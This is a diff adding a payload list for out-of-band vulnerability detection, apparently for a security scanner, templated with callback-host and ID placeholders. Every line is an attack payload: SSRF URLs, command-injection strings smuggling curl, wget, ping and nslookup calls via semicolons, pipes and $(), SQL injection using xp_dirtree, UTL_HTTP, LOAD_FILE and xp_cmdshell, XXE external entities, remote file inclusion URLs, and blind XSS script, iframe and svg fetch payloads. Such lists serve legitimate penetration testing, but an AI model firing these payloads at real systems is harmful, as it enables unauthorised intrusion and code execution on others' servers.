@@ -1,0 +1,39 @@
+# OOB SSRF Payloads
+http://{{CALLBACK_URL}}/ssrf_{{ID}}
+https://{{CALLBACK_URL}}/ssrf_{{ID}}
+//{{CALLBACK_URL}}/ssrf_{{ID}}
+@{{CALLBACK_URL}}/ssrf_{{ID}}
+
+# OOB RCE Payloads (Command Injection)
+curl http://{{CALLBACK_URL}}/rce_{{ID}}
+wget http://{{CALLBACK_URL}}/rce_{{ID}}
+ping -c 1 {{CALLBACK_URL}}
+nslookup {{CALLBACK_URL}}
+`curl http://{{CALLBACK_URL}}/rce_{{ID}}`
+$(curl http://{{CALLBACK_URL}}/rce_{{ID}})
+;curl http://{{CALLBACK_URL}}/rce_{{ID}};
+|curl http://{{CALLBACK_URL}}/rce_{{ID}}|
+&curl http://{{CALLBACK_URL}}/rce_{{ID}}&
+
+# OOB SQL Injection Payloads (requires database with outbound capabilities)
+'; EXEC master..xp_dirtree '\\{{CALLBACK_URL}}\sqli_{{ID}}' --
+' AND 1=UTL_HTTP.REQUEST('http://{{CALLBACK_URL}}/sqli_{{ID}}') --
+' UNION SELECT LOAD_FILE('\\\\{{CALLBACK_URL}}\\sqli_{{ID}}') --
+' OR 1=1; EXEC xp_cmdshell 'curl http://{{CALLBACK_URL}}/sqli_{{ID}}' --
+
+# OOB XXE Payloads (XML External Entity)
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://{{CALLBACK_URL}}/xxe_{{ID}}'>]><root>&test;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{{CALLBACK_URL}}/xxe_{{ID}}"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{CALLBACK_URL}}/xxe_{{ID}}">]><foo>&xxe;</foo>
+
+# OOB RFI Payloads (Remote File Inclusion)
+http://{{CALLBACK_URL}}/rfi_{{ID}}.php
+http://{{CALLBACK_URL}}/rfi_{{ID}}.txt
+//{{CALLBACK_URL}}/rfi_{{ID}}.php
+
+# OOB Blind XSS Payloads (Stored, triggers later)
+<script src="http://{{CALLBACK_URL}}/xss_{{ID}}.js"></script>
+<img src="http://{{CALLBACK_URL}}/xss_{{ID}}.gif">
+<iframe src="http://{{CALLBACK_URL}}/xss_{{ID}}"></iframe>
+<svg onload="fetch('http://{{CALLBACK_URL}}/xss_{{ID}}')">
+"><script>fetch('http://{{CALLBACK_URL}}/xss_{{ID}}')</script>
